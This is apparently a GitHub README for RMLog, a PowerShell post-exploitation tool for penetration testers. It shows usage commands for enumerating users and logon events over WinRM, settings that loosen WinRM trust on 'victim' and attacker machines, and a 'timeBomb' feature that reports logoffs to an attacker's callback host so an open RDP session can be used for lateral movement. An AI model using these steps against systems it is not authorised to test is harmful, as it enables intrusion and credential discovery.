# RMLog
RMLog is a post exploitation powershell script which it uses windows event logs to gather information about internal network in a pentration testing engagment. It is not only useful for blue teams but also for red teams because some of its functionalities can be used for lateral movement. You will be able to use RMLog not only on a localhost machine but also in a remote machine using WinRM protocol which is by default enabled in a newly Windows versions. 


## Usage

Use can use the following event types:

1) Information EventID (4624) - An account was successfully logged on
2) Information EventID (4625) - An account failed to log on
3) Information EventID (4728) - A member was added to a security-enabled global group 
4) Information EventID (4732) - A member was added to a security-enabled local group
5) Information EventID (4733) - A member was removed from a security-enabled local group
6) Information EventID (4738) - A user account was changed
7) Information EventID (4647) - User initiated logoff
8) Information EventID (4688) - A new process has been created
9) Information EventID (4776) - The domain controller attempted to validate the credentials for an account

## Configuration

In some cases may be you need to configure WinRM protocol to be functional

On client side (attacker):

	winrm quickconfig
	winrm set winrm/config/client '@{TrustedHosts="*"}'
		
On the server side (victim):
		
	Enable-PSRemoting -Force
	winrm quickconfig

### Examples

The RMLog searching into newest 10(default value) entries into all event types.

```
PS> RMLog -user <username> -pass <password> -ip <remote winrm ip>
PS> RMLog -user <username> -pass <password> -fips <file with ips>
PS> RMLog -ip 127.0.0.1
```

Search into specific eventID using -eventID parameter
```
PS> RMLog -user <username> -pass <password> -ip <remote winrm ip> -eventID <eventID>
PS> RMLog -user <username> -pass <password> -fips <file with ips> -eventID <eventID>
PS> RMLog -ip 127.0.0.1 -eventID <eventID> 
```

![alt text](https://github.com/tasox/LogRM/blob/master/example1_.png)

If you use -newest parameter then you will be able to search into a specific quantity of entries and in many cases your results will be more accurate.

```
PS> RMLog -user <username> -pass <password> -ip <remote winrm ip> -newest <number>
PS> RMLog -user <username> -pass <password> -fips <file with ips> -newest <number>
PS> RMLog -ip 127.0.0.1 -newest <number>
```

![alt text](https://github.com/tasox/LogRM/blob/master/example2_.png)

Providing the -users flag you will get as a result some valid usernames. The RMLog searches into these event IDs 4624,4625,4776 

```
PS> RMLog -user <username> -pass <password> -ip <remote winrm ip> -users
PS> RMLog -user <username> -pass <password> -fips <file with ips> -users
PS> RMLog -ip 127.0.0.1 -users
```

In earlier windows versions for example Windows server 2008, you can not have more than 5 winrm connections with the same host

## Time Bomb 

TimeBomb is useful when you landed on a network host and you want to get a notification when the user is logged of and be able to use an RDP (Remote Desktop) connection. If the user has a remote desktop with another network host and after logging out left the remote desktop open then you could move into the network from an existing forgotten RDP connection. In the background function uses 4624,4647 events and search for current login users. You can create a timer without creating or editing windows schedules and leave the host untouched. You have 3 option when you create a timeBob:

1) now
2) once
3) trigger

Tip1: Give as much as possible amount of entries in -newest parameter. For example: 5000

Tip2: If you want to get notifications only from users who have open RDP connection(s) before logged out then you should uncomment the line 785

The task is going to run now.
```
PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
```

#### Example 1 - User is logged on

![alt text](https://github.com/tasox/LogRM/blob/master/timeBomb_userisloggedon_700x600.png)


The task is going to run once at specific time.
```
PS> timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
```

The task is going to run and stop at specific time.
```
PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
```

## Authors

* TasoX (@taso_x)



